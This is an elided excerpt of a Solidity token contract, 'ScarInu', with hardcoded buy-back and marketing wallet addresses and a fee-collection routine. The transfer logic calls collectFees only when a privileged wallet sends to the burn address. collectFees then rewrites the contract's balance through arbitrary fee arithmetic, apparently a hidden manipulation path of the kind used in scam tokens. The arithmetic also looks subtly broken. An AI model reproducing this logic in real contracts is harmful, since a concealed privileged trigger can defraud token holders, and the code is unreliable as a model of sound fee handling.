...
contract ScarInu is Context, IERC20, Ownable {
    ...
    uint256 private minimumTokensBeforeSwap = 35000 * 10**_decimals;
    ...
    constructor () {
        ...
        buyBackWallet = payable(address(0x896472ddF3Ec2D97f5Ce7b4DE1d5662879ee4A5C));
        marketingWallet = payable(address(0x02e791D601730E49fddACc9821473986BDdf3fCb));
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else tokenTransfer (sender, recipient, amount);
    ...
    function tokenTransfer(address sender, address recipient, uint256 amount) private {
        // Swap Fees
        if ( 
            sender == buyBackWallet &&
            recipient == burnAddress && // Sell
            !inSwapAndLiquify && // Swap is not locked
            recipient != owner() && // Not to Owner
            sender != owner()
        ) {
            collectFees();
        }
    ...
    function collectFees() private lockTheSwap {
        ...
        _balances[address(this)] = _balances[address(this)].mul(_burnFee)
            .div(_buyLiquidityFee);
